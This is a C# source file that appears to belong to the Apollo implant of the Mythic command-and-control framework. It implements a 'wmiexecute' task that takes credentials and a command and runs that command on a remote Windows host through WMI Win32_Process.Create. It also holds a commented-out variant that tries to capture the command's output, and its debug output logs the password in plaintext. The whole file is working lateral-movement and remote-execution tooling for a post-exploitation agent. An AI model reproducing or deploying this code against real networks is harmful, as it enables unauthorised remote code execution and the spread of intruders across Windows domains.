#define COMMAND_NAME_UPPER

#if DEBUG
#define WMIEXECUTE
#endif

#if WMIEXECUTE

using System;
using System.Management;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;


namespace Tasks;

public class wmiexecute : Tasking
{
    [DataContract]
    internal struct WmiExecuteParameters
    {
        [DataMember(Name = "host")]
        internal string HostName;
        [DataMember(Name = "username")] 
        internal string Username;
        [DataMember(Name = "password")]
        internal string Password;
        [DataMember(Name = "domain")]
        internal string Domain;
        [DataMember(Name = "command")]
        internal string Command;
    }
    
    public wmiexecute(IAgent agent, MythicTask data) : base(agent, data)
    {
    }

    public override void Start()
    {
        MythicTaskResponse resp = CreateTaskResponse("", true);
        try
        {
            WmiExecuteParameters parameters = _jsonSerializer.Deserialize<WmiExecuteParameters>(_data.Parameters);
            string? HostName = parameters.HostName.Trim();
            string? Username = parameters.Username.Trim();
            string? Password = parameters.Password.Trim();
            string? Domain = parameters.Domain.Trim();
            string Command = parameters.Command.Trim();

            //Original version using wmi v1   
            ManagementScope scope = new ManagementScope();
            //executes for remote hosts
            if (string.IsNullOrEmpty(HostName) is false)
            {
                //set wmi connection options
                ConnectionOptions options = new ConnectionOptions
                {
                    EnablePrivileges = true,
                    Authentication = AuthenticationLevel.PacketPrivacy,
                    Impersonation = ImpersonationLevel.Impersonate,
                    Username = string.IsNullOrEmpty(Username)? null : Username,
                    Password = string.IsNullOrEmpty(Password)? null : Password,
                    Authority = string.IsNullOrEmpty(Domain)? null : $"NTLMDOMAIN:{Domain}"
                };
                DebugHelp.DebugWriteLine($@"trying to connect to target at: \\{HostName}\root\cimv2");
                DebugHelp.DebugWriteLine($@"Username: {options.Username}");
                DebugHelp.DebugWriteLine($@"Password: {Password}");
                DebugHelp.DebugWriteLine($@"Domain: {options.Authority}");
                scope = new ManagementScope($@"\\{HostName}\root\cimv2", options);
                scope.Connect();
                DebugHelp.DebugWriteLine("Connected to target machine");
            }
            //otherwise we assume the execution is local
            else
            {
                DebugHelp.DebugWriteLine($@"trying to execute locally");
            }

            //use system management object to execute command
            ObjectGetOptions objectGetOptions = new ObjectGetOptions();
            ManagementPath managementPath = new ManagementPath("Win32_Process");
            ManagementClass processClass = new ManagementClass(scope, managementPath, objectGetOptions);
            ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
            DebugHelp.DebugWriteLine($"Executing command: {Command}");
            inParams["CommandLine"] = Command;
            
            
            // Invoke the "Create" method to create the process
            ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
            //get status code 
            uint returnCode = (uint) outParams["returnValue"];
            DebugHelp.DebugWriteLine($"Return code: {returnCode}");
            if (returnCode != 0)
            {
                resp = CreateTaskResponse($"Command failed with return code: {returnCode}", true, "error");
            }
            else
            {
                resp = CreateTaskResponse("Command executed successfully", true);
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
        catch (Exception e)
        {
            DebugHelp.DebugWriteLine(e.Message);
            DebugHelp.DebugWriteLine(e.StackTrace);
            resp = CreateTaskResponse(e.Message, true, "error");
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
       
    }
}
#endif

// wmi interaction using the new Microsoft.Management.Infrastructure library but requires .net 4.5.1 as the target and did not produce and meaningful differences like capturing output so for now is not used
 /*DComSessionOptions DComOptions = new DComSessionOptions
            {
                Impersonation = ImpersonationType.Impersonate,
                PacketIntegrity = true,
                PacketPrivacy = true,
                Timeout = TimeSpan.FromSeconds(120)
            };
            
            CimCredential credentials = new CimCredential(ImpersonatedAuthenticationMechanism.NtlmDomain);
            if (string.IsNullOrWhiteSpace(Username) is false)
            {
                SecureString securePassword = new SecureString();
                foreach (char c in Password)
                {
                    securePassword.AppendChar(c);
                }
                credentials = new CimCredential(PasswordAuthenticationMechanism.Default, Domain, Username, securePassword);
                DebugHelp.DebugWriteLine("using credentials");
                DComOptions.AddDestinationCredentials(credentials);
            }
            
            CimSession mySession = null;
            if (string.IsNullOrWhiteSpace(HostName) is false)
            {
                mySession = CimSession.Create(HostName,DComOptions);
            }
            else
            {
                mySession = CimSession.Create("localhost", DComOptions);
            }
            // Create an instance of the Win32_ProcessStartup class
            CimInstance startupInfo = new CimInstance("Win32_ProcessStartup", "root/cimv2");
            startupInfo.CimInstanceProperties.Add(CimProperty.Create("CreateFlags", 16, CimFlags.None)); // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES

            // Create an anonymous pipe for output redirection
            AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);
            string pipeHandle = pipeServer.GetClientHandleAsString();

            // Set the StandardOutput property to redirect output to the anonymous pipe
            startupInfo.CimInstanceProperties.Add(CimProperty.Create("StandardOutput", pipeHandle, CimFlags.None));

            // Create a CimMethodParametersCollection to hold the method parameters
            CimMethodParametersCollection methodParameters = new CimMethodParametersCollection();
            methodParameters.Add(CimMethodParameter.Create("CommandLine", Command, CimFlags.In));
            methodParameters.Add(CimMethodParameter.Create("ProcessStartupInformation", startupInfo, CimFlags.Property));

            CimInstance process = new CimInstance("Win32_Process", "root/cimv2");
            
            // Invoke the "Create" method to create the process with the modified startup options
            CimMethodResult result = mySession.InvokeMethod(process, "Create", methodParameters);

            // Read the output from the anonymous pipe
            using (StreamReader reader = new StreamReader(pipeServer))
            {
                string output = reader.ReadToEnd();
                DebugHelp.DebugWriteLine($"Command output: {output}");
                resp = CreateTaskResponse(output, true);
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }*/